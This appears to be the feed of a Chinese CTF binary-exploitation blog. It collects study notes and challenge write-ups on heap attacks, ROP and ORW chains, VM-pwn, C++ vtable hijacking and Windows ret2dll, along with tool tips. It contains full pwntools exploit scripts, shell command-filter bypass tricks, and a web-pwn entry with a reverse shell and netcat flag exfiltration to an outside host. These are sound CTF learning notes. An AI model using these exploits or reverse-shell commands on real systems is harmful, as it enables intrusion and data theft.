pop_rdi=libcbase+0x2a3e5 pop_rsi=libcbase+0x2be51 pop_rdx=libcbase+0x796a2 open_addr=libcbase+libc.sym[&#39;open&#39;] read_addr = libcbase + libc.sym[&#39;read&#39;] write_addr=libcbase+libc.sym[&#39;write&#39;] flag=libcbase + next(libc.search(b&#39;flag&#39;)) payload=p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(open_addr) payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(0x100)+p64(read_addr) payload+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(0x100)+p64(write_addr)+p64(0xdeadbeef) #orw的题目用open打开后文件描述符一般都是3，所以这里我也用3作为参数，结果远程环境不是3， orw_shellcode= shellcraft.open(&#39;flag&#39;) orw_shellcode += shellcraft.read(3,0x66660200,0x100) orw_shellcode += shellcraft.write(1,0x66660200,0x100) sh.send(asm(orw_shellcode)) libc.address = libc_base libc_rop = ROP(libc) pop_rax = libc_rop.find_gadget([&#39;pop rax&#39;,&#39;ret&#39;])[0] pop_rdi = libc_rop.find_gadget([&#39;pop rdi&#39;,&#39;ret&#39;])[0] pop_rsi = libc_rop.find_gadget([&#39;pop rsi&#39;,&#39;ret&#39;])[0] pop_rdx = libc_rop.find_gadget([&#39;pop rdx&#39;,&#39;pop rbx&#39;,&#39;ret&#39;])[0] leave_ret = libc_rop.find_gadget([&#39;leave&#39;,&#39;ret&#39;])[0] syscall_ret = libc_rop.find_gadget([&#39;syscall&#39;,&#39;ret&#39;])[0] def syscall(rax=0, rdi=0, rsi=0, rdx=0): pay = p64(pop_rax) + p64(rax) pay += p64(pop_rdi) + p64(rdi) pay += p64(pop_rsi) + p64(rsi) pay += p64(pop_rdx) + p64(rdx) * 2 pay += p64(syscall_ret) return pay def read_(fd, buf, count): return syscall(0, fd, buf, count) def write_(fd, buf, count): return syscall(1, fd, buf, count) def open_(filename=0, modes=0, flags=0): return syscall(2, filename, modes, flags) def dup2_(old_fd, new_fd): return syscall(33, old_fd, new_fd) def socket_(domain=2,TYPE=1,protocol=6): return syscall(0x29,domain, TYPE, protocol) def connect_(fd=0,addr=0,LEN=0x10): return syscall(0x2a,fd, addr, LEN) python中处理word,dword,qword 处理两个字节，四个字节可以用如下方式，虽然python没有很细致的区分这些，但是可以通过如下方式处理 def calc_sum(payload): res = 0 payload = b&#34;fakeipheadfa&#34; + payload assert len(payload) % 2 == 0 for i in range(len(payload) // 2): tmp = payload[2*i: 2*i+2] tmp = int.from_bytes(tmp, &#34;little&#34;) res ^= tmp return res   ]]></content></entry><entry><title>tilix</title><url>/post/tools/tilix/</url><categories><category>Tools</category></categories><tags><tag>tools</tag></tags><content type="html"> 参考博客</content></entry><entry><title>tls</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBtcache/tls/</url><categories><category>PWN</category><category>堆攻击tcache</category></categories><tags><tag>tls</tag></tags><content type="html"><![CDATA[  [TOC] 参考文章 对于tcache 修改线程tcache变量 在tls区域，有一个线程变量tcache，如果能用largebin attack修改tcache变量，也可以控制tcache的分配。其实这个地方指向的位置本身就是heapbase+0x10，就是tcache_perthread_struct结构从counts开始的地方 具体做法： pwndbg&amp;gt; search -p 0x55555555b010 0x55555555b010这个值实际上是heapbase+0x10 Searching for value: b&amp;#39;\x10\xb0UUUU\x00\x00&amp;#39; pwn 0x555555558260 0x55555555b010 [anon_7ffff7fc2] 0x7ffff7fc7538 0x55555555b010 pwndbg&amp;gt; hex 0x7ffff7fc7538-0x7ffff7ddc000 +0000 0x1eb538 stack_guard 找的方法和pointer guard一样
pointer guard 结构体的类型为struct pthread，我们称其为一个thread descriptor，该结构体的第一个域为tchhead_t类型，其定义如下： typedef struct { void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; int gscope_flag; uintptr_t sysinfo; uintptr_t stack_guard; 0x28 uintptr_t pointer_guard; 0x30 unsigned long int vgetcpu_cache[2]; /* Bit 0: X86_FEATURE_1_IBT. Bit 1: X86_FEATURE_1_SHSTK. */ unsigned int feature_1; int __glibc_unused1; /* …  ]]></content></entry><entry><title>tmux</title><url>/post/tools/tmux/</url><categories><category>Tools</category></categories><tags><tag>tools</tag></tags><content type="html"> [TOC] 参考博客 参考博客 基本概念 session：一个服务器可以包含多个会话，可以理解成是一个特定的终端组合，通常将同一任务下的工作放到一个会话中。 window：一个会话可以包含多个窗口，一个窗口就相当于普通终端的一个标签，通常在不同的窗口中完成不同的工作。 pane：一个窗口可以被分割成多个小的窗格。 #基础用法 启动：tmux 信息查询： tmux list-keys 列出所有可以的快捷键和其运行的 tmux 命令 tmux list-commands 列出所有的 tmux 命令及其参数 tmux info 流出所有的 session, window, pane, 运行的进程号，等。 窗口的控制： session 会话：session是一个特定的终端组合。输入tmux就可以打开一个新的session tmux new -s session_name 创建一个叫做 session_name 的 tmux session tmux attach -t session_name 重新开启叫做 session_name 的 tmux session tmux switch -t session_name 转换到叫做 session_name 的 tmux session tmux list-sessions / tmux ls 列出现有的所有 session tmux detach 离开当前开启的 session tmux kill-server 关闭所有 session window 窗口：session 中可以有不同的 window（但是同时只能看到一个 window） tmux new-window 创建一个新的 window tmux list-windows tmux select-window -t :0-9 根据索引转到该 window tmux rename-window 重命名当前 window pane 面板：window 中可以有不同的 pane（可以把 window 分成不同的部分） tmux split-window 将 window 垂直划分为两个 pane tmux split-window -h 将 window 水平划分为两个 pane tmux swap-pane -U 在指定的方向（方向有：U、D、L、R 四种） …</content></entry><entry><title>tools installation</title><url>/post/tools/tools-installation/</url><categories><category>Tools</category></categories><tags><tag>tools</tag></tags><content type="html"> u24 pwn环境安装 pwntools 直接pip install pwntools
ROPgadget 参考此篇博客 安装报错解决 one_gadget sudo apt update sudo apt install ruby gem install one_gadget
ida 吾爱破解
linux安装ida9 gdb pwndbg 参考此篇博客 sudo ./setup.sh
burpsuite 直接下载community版本即可 修改字体大小</content></entry><entry><title>tricks</title><url>/post/pwn%E7%AC%94%E8%AE%B0/tricks/</url><categories><category>PWN</category><category>PWN笔记</category></categories><tags><tag>pwn-tricks</tag></tags><content type="html"><![CDATA[  [TOC]
做题步骤 第一步先checksec(checksec至关重要，因为如果partial rello那么很可能会打got，然后no pie这种很可能最终就是栈溢出)和看libc版本，第二步查看有无直接后门，第三步看有无格式化字符串漏洞，第四步看有无整数溢出，第五步看看能否打syscall或者srop，最后一步再正常打看怎么打 栈溢出 strcat会拼接字符串，他会在指针指向位置后的第一个\x00位置处继续写入，这里的方法是将canary末尾的\x00覆盖，然后strcat会从canary之后的\x00，也就是ebp处的位置开始写入，接这样实现了绕过canary去写入返回地址，然后strcpy重新写入canary末尾的\x00 不要放过任何细节，包括init函数，username,不要放过任何一个泄露函数 用environ环境变量泄露栈，由于远程的flag存放在栈中，所以可以加偏移循环爆破flag 有时候ida反汇编会是read(0, comment, 0x8CuLL);这样的，但是仔细看汇编代码是这样的，需要引起注意 无法泄露栈地址，同时下一条指令又是leave;ret 可以考虑partial overwrite rbp的值 静态链接的题一般都打ret2syscall，在bss读入/bin/sh\x00 对于每个写操作都要多留意，是否会有任意地址写（有时候写一个字节也很重要） 选择改close末位字节为syscall，利用read函数控制rax寄存器的值 格式化字符串 禁用了$，但是形如%c%c中的第二%c也是会匹配第二个参数的，这样叠加一下就可以控制任意地址写了 命令执行绕过 这篇博客对命令执行讲解的挺全 \n,\t都是转移字符，read的时候不会当作两个字符，没有&amp;rsquo;&#39;，必须用转义字符\。同时注意与/区分，&amp;rsquo;/&amp;lsquo;字符是存在的。 echo &amp;lsquo;$(c&amp;quot;at&amp;quot; flag)&amp;lsquo;命令会执行cat flag，因为括号中的内容会被当作命令进行执行。使用双引号和单引号，隔离拼接关键字来进行绕过。c&amp;rsquo;a&amp;rsquo;t flag,c&amp;quot;at&amp;quot; flag \符号,会将两字符串拼成一个字符串来使用。c\at flag,cat fl\ag 在bash环境中，有些的特殊变量都 …  ]]></content></entry><entry><title>uaf</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBtcache/uaf/</url><categories><category>PWN</category><category>堆攻击tcache</category></categories><tags><tag>uaf</tag></tags><content type="html"> [TOC] UAF不仅可以泄露，还能让两个指针指向同一个chunk
题目分析 巅峰极客2022 happy_note libc2.35
add大小要&amp;amp;lt;=0x200，add时无read。然后add有两种模式，第一种模式是calloc，第二种模式是malloc，但是只能malloc两次 delete函数没有uaf，magic函数也是free但是不会清除chunklist中的内容，只能一次 edit函数和show函数没什么特别的 思路分析 显然是要打IO链，于是想到要泄露heapbase与libcbase 因为不能申请largebin chunk,因此泄露heapbase只能用tcache来泄露。但是要记住calloc申请时会清空数据，因此泄露不能用calloc，就只能用次数极少的malloc。这里可以free后再次malloc申请就可以了 然后是要泄露libcbase,这里的想法是把一个放入unsorted bin中，但这就要先填满tcache才行，显然最后是要用tcache来任意地址申请，所以最后剩的一次malloc时不能用的，这里最后用的magic的uaf来泄露，同时这个uaf也会造出两个指针指向同一个chunk，这也是uaf威力巨大之处 如果有三次malloc机会，那么直接打tcache poison就好了，但是泄露完heapbase后只有一次，那么意味着申请这个任意地址时，这个任意地址应当在tcache的最头部，于是想到tcache stashing unlink attack来进行任意地址申请 exp 这里记录一下tcache stashing unlink attack的一些细节
在上述流程中，直接将chunk_A的bk改为target_addr - 0x10（这是因为返回给用户的是mem区域），并且保证target_addr - 0x10的bk的fd为一个可写地址（即*(target+0x8)是一个可写地址）在上述流程中，使tcache有5个堆块，smallbin有2个堆块 使tcache有5个堆块，smallbin有2个堆块时，smallbin的堆块一般都是通过unsorted bin切割得到 不申请_IO_list_all就是因为*(_IO_list_all+0x8)不是一个可写地址 from pwn import * from …</content></entry><entry><title>unsafe unlink</title><url>/post/%E5%A0%86%E6%9D%82%E8%AE%B0/unsafe-unlink/</url><categories><category>PWN</category><category>堆杂记</category></categories><tags><tag>unsafe unlink</tag></tags><content type="html"><![CDATA[  [TOC]
核心 这个技巧适用于no pie的情况下使用
chunk 0 ptr store in &amp;amp;ptr malloc(0x420) # not in fastbin or tcache malloc(0x420) edit(0, p64(0)+p64(fake_size)+p64(&amp;amp;ptr-0x18)+p64(&amp;amp;ptr-0x10)+p64(0)*k + p64(fake_prev_size)+p64(size)) # fakesize = 0x430-0x10 限制: overflow ,可以修改prev_inuse触发fake chunk unlink and consolidate 主要适用于可以知道堆指针存储基址的情况，可以控制堆管理机构（no pie） 效果: 可以将ptr处地址改写为&amp;amp;ptr-0x18 need fake_prev_size = prev_size-0x10, sive.PREV_INUSE = 0 利用思路 控制了堆管理结构可以做的事情就很多了
例题 DASCTF X 0psu3十一月挑战赛 garbage 题目分析： libc2.35,no pie，只能申请largebin chunk，但是没有uaf，edit中有off-by-null可以使用，显然要进行unlink 难点分析 主要在于没有uaf，笔者最不会这种没有uaf的，因为这样堆风水的构造就要更加细节，这题没有edit，是通过控制堆管理结构，然后修改size大小，这样就可以通过其prev chunk来修改到它本身进行largebin attack from pwn import * from pwnlib.util.packing import u64 from pwnlib.util.packing import p64 from pwnlib.util.packing import p32 context(os=&amp;#39;linux&amp;#39;, arch=&amp;#39;amd64&amp;#39;, log_level=&amp;#39;debug&amp;#39;) r=process(&amp;#34;/home/zp9080/PWN/pwn&amp;#34;) elf=ELF(&amp;#34;/home/zp9080/PWN/pwn&amp;#34;) …  ]]></content></entry><entry><title>unsorted bin attack</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BB%E6%97%A7%E7%89%88/unsorted-bin-attack/</url><categories><category>PWN</category><category>堆攻击旧版</category></categories><tags><tag>unsorted bin attack</tag></tags><content type="html"><![CDATA[  [TOC] 1.unsorted bin attack 被利用的前提是控制 unsorted bin chunk 的 bk 指针或者有show函数。 2.unsorted bin attack的目的一般是为别的attack做准备，比如可以通过main_arena泄露出libc
unsorted bin来源 unsorted bin leak 如果我们可以把正确的 fd 指针 leak 出来，就可以获得一个与 main_arena 有固定偏移的地址，这个偏移可以通过调试得出。而main_arena 是一个 struct malloc_state 类型的全局变量，是 ptmalloc 管理主分配区的唯一实例。说到全局变量，立马可以想到他会被分配在 .data 或者 .bss 等段上，那么如果我们有进程所使用的 libc 的 .so 文件的话，我们就可以获得 main_arena 与 libc 基地址的偏移，实现对 ASLR 的绕过 泄露libcbase的方法：比较巧合的是，main_arena 和 __malloc_hook 的地址差是 0x10，而大多数的 libc 都可以直接查出 __malloc_hook 的地址,这样就可以获得 main_arena 与基地址的偏移从而获得libcbase了 main_arena_offset = libc.sym[&quot;__malloc_hook&quot;] + 0x10 libcbase=u64(sh.recvuntil(&rsquo;\x7f&rsquo;)[-6:].ljust(8,b&rsquo;\x00&rsquo;))-main_arena_offset-96 利用方法 unsorted bin 任意地址写一个很大的数 当将一个 unsorted bin大小的chunk被取出的时候，如下： //victim就是即将被取出的chunk //unsorted_chunks (av)就是unsorted bin链表头 1.victim = unsorted_chunks(av)-&gt;bk=p 2.bck = victim-&gt;bk=p-&gt;bk = target addr-0x10 3.unsorted_chunks(av)-&gt;bk = bck=target addr-0x10 4.bck-&gt;fd = *(target addr -0x10+0x10) = unsorted_chunks(av); 结合unsorted bin的链表结构想象一下 最终效果是target=unsorted_chunks (av)，也就是target是一个很大的值 wiki笔记 总结：这里我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大。这看起来似乎并没有什么用处，但是其实还是有点卵用的，比如说: 1.我们通过修改循环的次数来使得程序可以执行多次循环。 2.我们可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。   ]]></content></entry><entry><title>vm pwn例题</title><url>/post/vm-pwn/vm-pwn%E4%BE%8B%E9%A2%98/</url><categories><category>PWN</category><category>Vm Pwn</category></categories><tags><tag>vm pwn</tag></tags><content type="html"><![CDATA[  OGEEK2019_FINAL_OVM 数组溢出
from pwn import * context.log_level=&#39;debug&#39; p = process(&#34;vmpwn&#34;) elf = ELF(&#34;vmpwn&#34;) libc = elf.libc s = lambda data :p.send(data) sa = lambda text,data :p.sendafter(text, str(data)) sl = lambda data :p.sendline(data) sla = lambda text,data :p.sendlineafter(text, str(data)) r = lambda num=4096 :p.recv(num) ru = lambda text :p.recvuntil(text) uu32 = lambda :u32(p.recvuntil(&#34;\xf7&#34;)[-4:].ljust(4,&#34;\x00&#34;)) uu64 = lambda :u64(p.recvuntil(&#34;\x7f&#34;)[-6:].ljust(8,&#34;\x00&#34;)) lg = lambda name,data :p.success(name + &#34;-&gt; 0x%x&#34; % data) def opcode(code, dst, op1, op2): res = code&lt;&lt;24 res += dst&lt;&lt;16 res += op1&lt;&lt;8 res += op2 return str(res) p.recvuntil(&#34;PC: &#34;) p.sendline(&#39;0&#39;) p.recvuntil(&#34;SP: &#34;) p.sendline(&#39;1&#39;) p.recvuntil(&#34;CODE SIZE: &#34;) p.sendline(&#39;24&#39;) p.recvuntil(&#34;CODE: &#34;) # 将stderr_got表里存的_IO_2_1_stderr的地址转递给reg[3]reg[2] sl(opcode(0x10, 0, 0, 26)) #reg[0] = 26 sl(opcode(0x80, 1, 1, 0)) #reg[1] = -26 sl(opcode(0x30, 2, 0, 1)) #reg[2] = memory[reg[1]] sl(opcode(0x10, 0, 0, 25)) #reg[0] = 25 sl(opcode(0x10, 1, 0, 0)) #reg[1] = 0 sl(opcode(0x80, 1, 1, 0)) #reg[1] = -25 sl(opcode(0x30, 3, 0, 1)) #reg[3] = memory[reg[1]] # reg[4]构造一个0x10a0，给reg[2]加上，即_IO_2_1_stderr+0x10a0=free_hook-8 sl(opcode(0x10, 4, 0, 1)) #reg[4] = 1 sl(opcode(0x10, 5, 0, 12)) #reg[5] = 12 sl(opcode(0xc0, 4, 4, 5)) #reg[4] = 1&lt;&lt;12 = 1000 sl(opcode(0x10, 5, 0, 0xa)) #reg[5] = 0xa sl(opcode(0x10, 6, 0, 4)) #reg[6] = 4 sl(opcode(0xc0, 5, 5, 6)) #reg[5] = 0xa0 sl(opcode(0x70, 4, 4, 5)) #reg[4] = reg[4]+reg[5] = 0x10a0 sl(opcode(0x70, 2, 4, 2)) #reg[2] = reg[4]+reg[2] # 将comment改为free_hook-8 sl(opcode(0x10, 4, 0, 8)) #reg[4] = 8 sl(opcode(0x10, 1, 0, 0)) #reg[1] = 0 sl(opcode(0x80, 1, 1, 4)) #reg[1] = 0-8 = -8 sl(opcode(0x40, 2, 0, 1)) #memory[reg[1] = reg[2]] sl(opcode(0x10, 5, 0, 7)) #reg[5] = 7 sl(opcode(0x10, 1, 0, 0)) #reg[1] = 0 sl(opcode(0x80, 1, 1, 5)) #reg[1] = reg[1] - reg[4] = -7 sl(opcode(0x40, 3, 0, 1)) #memory[reg[1]] = reg[3] sl(opcode(0xe0, 0, 0, 0)) #exit ru(&#39;R2: &#39;) low = int(r(8), 16) + 8 ru(&#39;R3: &#39;) high = int(r(4), 16) print hex(low), hex(high) libc_base = (high&lt;&lt;32) + low - libc.sym[&#39;__free_hook&#39;] lg(&#39;libc_base&#39;, libc_base) system = libc_base + libc.sym[&#39;system&#39;] # 读入comment，修改到free_hook sl(&#39;/bin/sh\x00&#39;+p64(system)) p.interactive() vheap 堆溢出修改fd
from pwn import * from pwnlib.util.packing import u64 from pwnlib.util.packing import p64 context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;) p=process(&#39;/home/zp9080/PWN/vheap&#39;) elf=ELF(&#39;/home/zp9080/PWN/vheap&#39;) libc=ELF(&#39;/home/zp9080/PWN/libc-2.27.so&#39;) def dbg(): gdb.attach(p,&#39;b *$rebase(0xEC6 )&#39;) pause() s = lambda data :p.send(data) sa = lambda text,data :p.sendafter(text, data) sl = lambda data :p.sendline(data) sla = lambda text,data :p.sendlineafter(text, data) r = lambda num=4096 :p.recv(num) ru = lambda text :p.recvuntil(text) uu64 = lambda :u64(p.recvuntil(&#34;\x7f&#34;)[-6:].ljust(8,&#34;\x00&#34;)) lg = lambda name,data :p.success(name + &#34;-&gt; 0x%x&#34; % data) pay = &#39;%20$p&#39; sla(&#34;first,tell me your name.&#34;,pay) p.recvuntil(&#34;welcome:&#34;) libc_base = int(p.recv(14),16)-231-libc.sym[&#39;__libc_start_main&#39;] lg(&#39;libc_base&#39;,libc_base) free_hook = libc_base+libc.sym[&#39;__free_hook&#39;] one = libc_base+0x4f302 sla(&#34;How many pieces of data?\n&#34;,&#39;2&#39;) s(b&#39;a&#39;*0x18+p64(0x70)+p64(free_hook)) s(p64(one)) p.recvuntil(&#34;Size:\n&#34;) s(&#39;9&#39;) def pack(code, dst, op2, op1): res = code&lt;&lt;24 res += dst&lt;&lt;16 res += op2&lt;&lt;8 res += op1 return str(res) p.recvuntil(&#34;[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++]&#34;) p.sendline(pack(0xa,0,0x10,0)) p.sendline(pack(0xa,0,0x60,1)) p.sendline(pack(0xa,0,0x60,2)) p.sendline(pack(0xc,0,0,1)) #直接打tcache poison p.sendline(pack(0xb,0,0,0))# memcpy p.sendline(pack(0xa,0,0x60,0)) p.sendline(pack(0xa,0,0x60,1)) p.sendline(pack(0xb,1,0,1)) p.sendline(pack(0xc,0,0,2)) p.interactive() &#39;&#39;&#39; 0x4f2a5 execve(&#34;/bin/sh&#34;, rsp+0x40, environ) constraints: rsp &amp; 0xf == 0 rcx == NULL 0x4f302 execve(&#34;/bin/sh&#34;, rsp+0x40, environ) constraints: [rsp+0x40] == NULL 0x10a2fc execve(&#34;/bin/sh&#34;, rsp+0x70, environ) constraints: [rsp+0x70] == NULL &#39;&#39;&#39;   ]]></content></entry><entry><title>vm pwn知识学习</title><url>/post/vm-pwn/vm-pwn%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/</url><categories><category>PWN</category><category>Vm Pwn</category></categories><tags><tag>vm pwn</tag></tags><content type="html"> 参考博客1 参考博客2 有时候可以逆向出结构体 vmpwn难度在于逆向，逆向结束后一般都是会有整数溢出进行任意地址读写或者是个堆题，七分逆向三分猜，多练习才是重点 一般vmpwn逆向结束后就是简单的pwn题技巧叠加，不会有太大难度。要综合性地考虑各种知识：整数溢出、格式化字符串漏洞、栈溢出、堆溢出，不要局限在某个方面，不然都很难解题 我们现在常见到的VMPwn基本设计如下： 分配内存模拟程序执行，基本组成要素为代码区和数据区，这两块区域可以分配在同一块内存或者两块独立内存。 数据区域包含模拟栈和模拟寄存器。 代码区根据用户指令模拟各种操作，如压栈出栈，寄存器立即数运算等。一般都是数据区的读写越界引发的漏洞，根据数据区内存分配位置的不同可以分为栈越界，bss越界和堆越界三类问题。</content></entry><entry><title>vtable</title><url>/post/c++-pwn/vtable/</url><categories><category>PWN</category><category>C++ Pwn</category></categories><tags><tag>c++ pwn</tag></tags><content type="html"><![CDATA[  例题 SICTF ROUND3 ezcpp
题目分析 题目上来泄露出了pie，也有后门函数，然后是两个功能get和print，核心思路是劫持vtable
细节阐述 对ida反汇编的函数不理解的需要动态调试看看到底是什么个功能
stdcin遇到\n才会停止读取 c++中strings也会在堆上开辟空间 vtable 堆中会开辟空间存结构体，第二张图中rdi的值heap-&gt;elf+0x4d48-&gt;函数的实际地址 逆向出来的结构 name长度为0x10字节，password长度为0x10字节，第二个chunk的mem位置，第一个存的是vtable，第二个存的是是name_addr 利用思路 修改图中0x340中的elf+0x4d48为name_addr，在name_addr处写入后门函数，实现对vtable的劫持 显然要泄露堆地址，这里有个很巧的地方就是原本存name_addr处的地方是0x348,print函数是用*name来进行打印的。如果把原本的name_addr修改为0x348，那么*0x348刚好就是其本身的值，打印出来就泄露了堆地址 from pwn import * from pwnlib.util.packing import p64 from pwnlib.util.packing import u64 context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;) def get(name, passwd): p.recvuntil(b&#39;&gt;&gt; &#39;) p.sendline(b&#39;G&#39;) p.recvuntil(b&#39;name: &#39;) p.sendline(name) p.recvuntil(b&#39;password: &#39;) p.sendline(passwd) def show(): p.recvuntil(b&#39;&gt;&gt; &#39;) p.sendline(b&#39;P&#39;) # p = process(&#34;/home/zp9080/PWN/cpp&#34;) p=gdb.debug(&#34;/home/zp9080/PWN/cpp&#34;,&#39;b *$rebase(0x274C)&#39;) # set offset to 0x40 to check if the offset is correct by comparing with vtable offset = 0x48 p.recvuntil(b&#39;gift: &#39;) main = int(p.recvuntil(b&#39;\n&#39;)[:-1], 16) pie = main - 0x2650 success(&#39;pie addr -&gt; {}&#39;.format(hex(pie))) backdoor = pie + 0x22e0 vtable = pie + 0x4d48 info(&#39;vtable -&gt; {}&#39;.format(hex(vtable))) get(b&#39;123&#39;,flat([b&#39;a&#39; * 0x10,0, 0x21,vtable, bytes([offset])])) show() p.recvuntil(b&#39;Name: &#39;) ptr = u64(p.recvuntil(b&#39;\n&#39;)[:-1].ljust(8, b&#39;\x00&#39;)) # heap name_addr = ptr - 0x38 get(flat([name_addr]),flat([0x21])) # if name is 123, rollback success fake_vtable = name_addr get(flat([backdoor, backdoor]), flat([b&#39;a&#39; * 0x10,0, 0x21,fake_vtable, name_addr])) # get or show will trigger the backdoor show() p.interactive()   ]]></content></entry><entry><title>Web Pwn常见做法</title><url>/post/web-pwn/web-pwn%E5%B8%B8%E8%A7%81%E5%81%9A%E6%B3%95/</url><categories><category>PWN</category><category>Web Pwn</category></categories><tags><tag>web pwn</tag></tags><content type="html"><![CDATA[  [TOC] 参考博客 VNCTF2022一道题 一般httpd程序的执行流程为 在main函数中用pthread或fork来进入HTTP请求处理函数 在HTTP请求处理函数中，过滤掉不合法的请求协议（通常只接受GET/POST）和请求目录（通常过滤掉含有”..”的url，使我们不能访问xxx.com/../flag 来直接读取flag） 根据请求url，跳转到对应的cgi函数或文件读取函数 常见利用思路 我们先创建/htdocs/index.html来保证程序能够正常运行。 不难想到通过指定地址泄露功能来拿到pie地址，再通过任意地址内容泄露功能打印出got表内容来泄露libc基地址，如果为传统pwn，我们就可以任意地址写修改hook为one_gadget或修改got表来运行system(&amp;ldquo;cat flag&amp;rdquo;)拿flag走人，但别忘了在httpd-pwn中，我们与程序的交互有socket的隔阂，我们只能获取到程序通过socket发送的内容，程序的输出对我们来说并不可见。 反弹flag方法 既然我们在socket语境下，那我们也用socket的方法解决问题。 首先我们需要控制程序流，我们注意到在输出功能中有一个strcmp函数以用户输入的字符串为参数，那我们就可以修改其为system函数来执行命令，我们就可以尝试反弹shell、反弹flag、写flag进文件的方法了。
本地不需要公网服务器也可以，自己的wsl的ip都可以
反弹shell 首先我们需要一台公网服务器，其ip假定为 1.1.1.1，我们登录服务器并运行命令nc -lvp 4444 在受害者的电脑上运行命令bash -i &amp;gt;&amp;amp; /dev/tcp/1.1.1.1/4444 0&amp;gt;&amp;amp;1，在此题语境下为执行system(&amp;ldquo;bash -i &amp;gt;&amp;amp; /dev/tcp/1.1.1.1/4444 0&amp;gt;&amp;amp;1&amp;rdquo;);（下略） 我们可以看到服务器上出现了受害者的shell，cat flag即可 反弹flag到nc 我们需要一台公网服务器，其ip假定为 1.1.1.1，我们登录服务器并运行命令nc -lvp 4444 在受害者的电脑上运行命令cat flag|nc 1.1.1.1 4444 服务器上接收到flag 反弹flag …  ]]></content></entry><entry><title>win pwn调试相关</title><url>/post/win-pwn/win-pwn%E8%B0%83%E8%AF%95%E7%9B%B8%E5%85%B3/</url><categories><category>PWN</category><category>Win Pwn</category></categories><tags><tag>win pwn</tag></tags><content type="html"> 在Windbg中，要查看当前指令所在的函数，您可以使用 ln（List Nearest Symbols）命令。该命令将告诉您当前执行指令所在的函数，以及在该函数中的偏移量。 dd esp L 50 kb查看函数栈 !peb 用于在Windows内核调试器中查看进程环境块（Process Environment Block，PEB）的内容 g前往下一个断点 t、s单步执行 bp addr下断点 bl显示当前已有断点</content></entry><entry><title>win pwn例题</title><url>/post/win-pwn/win-pwn%E4%BE%8B%E9%A2%98/</url><categories><category>PWN</category><category>Win Pwn</category></categories><tags><tag>win pwn</tag></tags><content type="html"><![CDATA[   最近打NKCTF遇到了一个winpwn，在此也是借着这个机会学习了一下 漏洞也很明显，如果是linux直接ret2libc很快就打完了，这里引入一个与其类似的概念,ret2dll 工具学习 参考博客 运行.\checksec.exe exe文件查看保护 windows上搭建python环境，winpwn，自己打的时候没有用winpwn还是用pwntools，感觉不是很影响 win_server这个还是很重要的，win_server.exe babystack.exe 10009（注意文件路径），之后ipconfig后就可以在本地远程连接 ret2dll 此篇博客已经非常详细 做题遇到的困难 windbg的使用很不习惯，花了很长时间 msvcrt.dll文件中找偏移不知道找谁的，最终确定是找这些，最后执行system(&ldquo;cmd.exe&rdquo;)拿到shell 本地的msvcrt.dll和给的不一样,windbg也没注意，耽误了很多时间，还不会像patchelf一样把dll文件patch到exe上，也还没搜到相应文章 注意32位传参方式 题目wp from pwn import * from pwncli import * from pwnlib.util.packing import u32 from pwnlib.util.packing import p32 from pwnlib.util.packing import p64 context(os=&#39;windows&#39;,log_level=&#39;debug&#39;,arch=&#39;i386&#39;) li = lambda x: print(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;) # 彩色打印 p = remote(&#39;123.60.25.223&#39;,10001) # p=remote(&#39;10.131.134.212&#39;,33679) p.sendlineafter(&#34;NKCTF2024&#34;, b&#39;%p&#39;*31) data = p.recvuntil(b&#39;ohhh,no&#39;).rstrip(b&#39;ohhh,no&#39;) # 获取末尾数据 canary= int(data[-8:], 16) print(&#39;canary&#39;,hex(canary)) puts=0x403F8C main=0x4014F1 payload=b&#39;a&#39;*0x64+p32(canary)+b&#39;a&#39;*0xc+p32(puts)+p32(main)+p32(0x40922C) p.sendline(payload) printf_addr=u32(p.recv(4)) print(&#39;printf_addr&#39;,hex(printf_addr)) dllbase=printf_addr-0x101767F0 print(&#39;dllbase:&#39;,hex(dllbase)) system=dllbase+0x10144700 cmd=dllbase+0x101048C8 payload=b&#39;a&#39;*0x64+p32(canary)+b&#39;a&#39;*0xc+p32(system)+p32(0xdeadbeef)+p32(cmd) p.sendline(payload) p.interactive()   ]]></content></entry><entry><title>zellij</title><url>/post/tools/zellij/</url><categories><category>Tools</category></categories><tags><tag>tools</tag></tags><content type="html"> 参考此篇博客</content></entry><entry><title>保护机制变动</title><url>/post/%E5%A0%86/%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%8F%98%E5%8A%A8/</url><categories><category>PWN</category><category>堆入门</category></categories><tags><tag>堆入门</tag></tags><content type="html"> 一篇讲这个的博客 house系列 tcachebin 堆指针异或加密（glibc-2.32 引入） fastbin 堆指针异或加密（glibc-2.32 引入） 堆内存对齐检查（glibc-2.32 引入） tcahebin 链的数量检查（glibc-2.33 引入） 移除__malloc_hook 和__free_hook（glibc-2.34 引入） 引入 tcache_key 作为 tcache 的 key 检查（glibc-2.34 引入） __malloc_assert 移除掉 IO 处理函数（glibc-2.36 引入） 移除__malloc_assert 函数（glibc-2.37 引入） 将 global_max_fast 的数据类型修改为 uint8_t（glibc-2.37 引入）</content></entry><entry><title>打法总述</title><url>/post/%E5%A0%86/%E6%89%93%E6%B3%95%E6%80%BB%E8%BF%B0/</url><categories><category>PWN</category><category>堆入门</category></categories><tags><tag>堆入门</tag></tags><content type="html"> [TOC] 打法总述 笔者对于这些攻击手法感觉不是很难，难的地方在于堆风水
